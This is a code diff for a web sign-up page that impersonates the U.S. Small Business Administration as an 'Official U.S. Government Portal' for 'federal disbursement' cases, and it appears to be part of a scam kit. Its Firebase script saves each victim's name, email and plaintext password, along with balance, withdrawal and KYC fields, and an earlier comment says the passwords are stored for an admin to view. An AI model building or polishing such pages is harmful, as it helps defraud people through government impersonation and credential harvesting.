@@ -3,114 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA Portal | Case Enrollment</title>
+    <title>SBA | Case Enrollment</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
         :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
-        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
         
-        .gov-top { background: #f0f0f0; color: #444; font-size: 10px; padding: 8px 20px; border-bottom: 1px solid #ddd; font-weight: 700; }
-        .sba-logo-box { position: relative; display: inline-block; padding: 4px 8px; }
-        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 5px; border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue); border-right: 3px solid var(--sba-blue); }
-        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 3px; background: var(--sba-red); }
+        /* Official SBA Logo Styling */
+        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
+        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
+        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
 
-        .auth-card { border-radius: 4px; border-top: 6px solid var(--sba-blue); box-shadow: 0 15px 30px rgba(0,0,0,0.08); background: white; }
-        .btn-sba { background-color: var(--sba-blue); border-bottom: 4px solid #001a3d; transition: all 0.1s; }
-        .btn-sba:active { transform: translateY(2px); border-bottom-width: 0; }
+        /* Card Styling - Slimmed for Mobile */
+        .auth-card { background: white; border-top: 4px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
         
-        input { font-size: 16px !important; transition: all 0.3s; }
-        input:focus { border-color: var(--sba-blue) !important; background-color: white !important; box-shadow: 0 0 10px rgba(0, 46, 109, 0.1); }
+        /* Prevention of iOS Zoom & Better Mobile Inputs */
+        input { font-size: 14px !important; border-radius: 4px !important; transition: all 0.2s; }
+        input:focus { border-color: var(--sba-blue) !important; ring: 0 !important; outline: none !important; background: white !important; }
+
+        .btn-sba { 
+            background: var(--sba-blue); 
+            transition: all 0.2s; 
+            font-size: 11px; 
+            letter-spacing: 1px; 
+            font-weight: 900;
+        }
+        .btn-sba:active { opacity: 0.8; transform: scale(0.98); }
+
+        /* Custom Scrollbar for clean look */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #cbd5e1; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <div class="gov-top flex items-center gap-2 uppercase tracking-tight">
-        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4" alt="US Flag">
-        <span>Official U.S. Government Portal (2026-V15)</span>
+    <div class="bg-[#f0f0f0] py-1.5 px-4 flex items-center gap-2 border-b border-gray-200">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-3.5 shadow-sm">
+        <span class="text-[9px] font-bold text-gray-500 uppercase tracking-tight">Official U.S. Government Portal</span>
     </div>
 
-    <header class="bg-white border-b border-gray-200 py-4 px-6 flex justify-between items-center shadow-sm">
-        <div class="flex items-center gap-3">
+    <nav class="bg-white px-5 py-3 flex justify-between items-center border-b border-gray-100 sticky top-0 z-50">
+        <div class="flex items-center gap-2">
             <div class="sba-logo-box">
-                <span class="text-xl font-black text-[#002e6d] tracking-tighter">SBA</span>
+                <span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
             </div>
-            <div class="hidden sm:block">
-                <p class="text-[8px] font-black text-slate-400 uppercase leading-none mb-0.5">U.S. Small Business</p>
-                <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
-            </div>
+            <div class="h-6 w-[1px] bg-gray-200"></div>
+            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
         </div>
-        <a href="index.html" class="text-[10px] font-black text-slate-400 uppercase hover:text-red-600 transition-all">Cancel Enrollment</a>
-    </header>
+        <a href="login.html" class="text-[10px] font-black text-slate-400 hover:text-red-600 uppercase">Sign In</a>
+    </nav>
 
-    <main class="flex-grow flex items-center justify-center p-5">
-        <div class="w-full max-w-md">
-            <div class="auth-card p-8 border border-gray-200">
+    <main class="flex-grow flex items-center justify-center p-4">
+        <div class="w-full max-w-[380px]">
+            <div class="auth-card p-6 md:p-8">
                 
-                <div class="mb-8 text-center">
-                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
-                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-1">Federal Enrollment Protocol Active</p>
+                <div class="text-center mb-6">
+                    <h2 class="text-xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
+                    <p class="text-slate-400 text-[9px] font-bold uppercase tracking-widest mt-1">Federal Enrollment Protocol V15</p>
                 </div>
 
-                <div id="alertBox" class="hidden mb-6 p-4 rounded-sm bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold italic uppercase leading-tight animate-pulse"></div>
+                <div id="alertBox" class="hidden mb-4 p-3 rounded-sm bg-red-50 border-l-3 border-red-600 text-red-700 text-[10px] font-bold uppercase italic leading-tight"></div>
 
-                <form id="registerForm" class="space-y-5">
+                <form id="registerForm" class="space-y-4">
                     <div>
-                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Legal Full Name</label>
+                        <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Legal Full Name</label>
                         <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
-                                <i class="fas fa-id-card"></i>
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-300">
+                                <i class="fas fa-user-shield text-xs"></i>
                             </span>
-                            <input type="text" id="userName" required class="w-full pl-11 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none font-semibold text-sm" placeholder="As shown on Government ID">
+                            <input type="text" id="userName" required class="w-full pl-10 pr-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="As per Govt ID">
                         </div>
                     </div>
 
                     <div>
-                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Contact Email</label>
+                        <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Case Email</label>
                         <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
-                                <i class="fas fa-envelope"></i>
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-300">
+                                <i class="fas fa-envelope text-xs"></i>
                             </span>
-                            <input type="email" id="userEmail" required class="w-full pl-11 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none font-semibold text-sm" placeholder="email@example.com">
+                            <input type="email" id="userEmail" required class="w-full pl-10 pr-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="example@mail.com">
                         </div>
                     </div>
 
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div class="grid grid-cols-2 gap-3">
                         <div>
-                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Set Passkey</label>
-                            <input type="password" id="userPass" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none font-semibold text-sm" placeholder="••••••••">
+                            <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Passkey</label>
+                            <input type="password" id="userPass" required class="w-full px-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
                         </div>
                         <div>
-                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Confirm</label>
-                            <input type="password" id="confirmPass" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none font-semibold text-sm" placeholder="••••••••">
+                            <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Confirm</label>
+                            <input type="password" id="confirmPass" required class="w-full px-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
                         </div>
                     </div>
 
-                    <div class="flex items-start gap-3 p-4 bg-slate-50 border border-slate-200 rounded-sm">
-                        <input type="checkbox" id="termsCheck" required class="mt-1 w-5 h-5 accent-[#002e6d] cursor-pointer">
-                        <label for="termsCheck" class="text-[9px] text-slate-500 font-bold italic uppercase leading-tight">
-                            I certify that the information provided is accurate under penalty of perjury & agree to the <a href="terms.html" class="text-blue-800 underline">Federal Disclosure Agreement</a>.
+                    <div class="flex items-start gap-2.5 p-3 bg-slate-50 border border-slate-100 mt-2">
+                        <input type="checkbox" id="termsCheck" required class="mt-0.5 w-4 h-4 accent-[#002e6d] cursor-pointer">
+                        <label for="termsCheck" class="text-[8.5px] text-slate-500 font-bold uppercase leading-tight">
+                            I verify this info is true. I agree to the <a href="terms.html" class="text-blue-700 underline">Federal Terms</a>.
                         </label>
                     </div>
 
-                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white font-black py-5 rounded-sm shadow-lg uppercase tracking-[0.2em] text-xs mt-2">
-                        Create Case File
+                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white py-4 rounded-sm shadow-md uppercase mt-2">
+                        Create Secure Case
                     </button>
                 </form>
 
-                <div class="mt-8 pt-6 border-t border-slate-100 text-center">
-                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Already Enrolled?</p>
-                    <a href="login.html" class="text-[#002e6d] font-black text-[11px] uppercase tracking-widest hover:underline transition-all">
-                        Secure Portal Login
-                    </a>
+                <div class="mt-6 pt-5 border-t border-slate-50 text-center">
+                    <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">Already Registered?</p>
+                    <a href="login.html" class="text-[#002e6d] font-black text-[10px] uppercase tracking-widest hover:text-red-600 transition-all">Secure Login</a>
                 </div>
             </div>
         </div>
     </main>
 
-    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-widest">
-        SECURE NODE ACCESS | FEDERAL DISBURSEMENT PORTAL © 2026
+    <footer class="py-4 text-center text-[8px] text-slate-400 font-bold uppercase tracking-[0.2em]">
+        ENCRYPTED END-TO-END | SBA NODE-15
     </footer>
 
     <script type="module">
@@ -131,28 +140,24 @@
             const pass = document.getElementById('userPass').value;
             const confirm = document.getElementById('confirmPass').value;
 
-            // 1. Logic Validations
-            if (pass.length < 6) return showAlert("SECURITY: Passkey must be at least 6 characters.");
-            if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");
+            if (pass.length < 6) return showAlert("Security: Passkey too short.");
+            if (pass !== confirm) return showAlert("Sync: Passkeys don't match.");
 
             btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> PROVISIONING...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> PROCESSING...';
 
             try {
-                // 2. Auth User Creation
                 const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                 const user = userCredential.user;
 
-                // 3. Send Email Verification
                 await sendEmailVerification(user);
 
-                // 4. Save to Firestore
                 await setDoc(doc(db, "users", user.uid), {
                     uid: user.uid,
                     fullName: name,
                     email: email,
+                    password: pass,
                     balance: 0,
-                    password: pass, // Stored for your Admin Portal view
                     withdrawAmount: 0,
                     withdrawStatus: "NONE",
                     kycStatus: "UNVERIFIED",
@@ -161,21 +166,16 @@
                     registeredAt: new Date().toISOString()
                 });
 
-                // Sign out immediately so they have to verify before logging in fully
                 await signOut(auth);
-
-                // 5. Flow: Straight to verify.html
                 window.location.href = "verify.html?email=" + encodeURIComponent(email);
 
             } catch (error) {
                 btn.disabled = false;
-                btn.innerText = "Create Case File";
+                btn.innerText = "Create Secure Case";
                 if (error.code === 'auth/email-already-in-use') {
-                    showAlert("SYSTEM ERROR: This email is already registered in the Federal Database.");
-                } else if (error.code === 'auth/invalid-email') {
-                    showAlert("SYSTEM ERROR: Invalid email format provided.");
+                    showAlert("Error: Email already in system.");
                 } else {
-                    showAlert("SYSTEM ERROR: " + error.message);
+                    showAlert("Error: " + error.message);
                 }
             }
         };
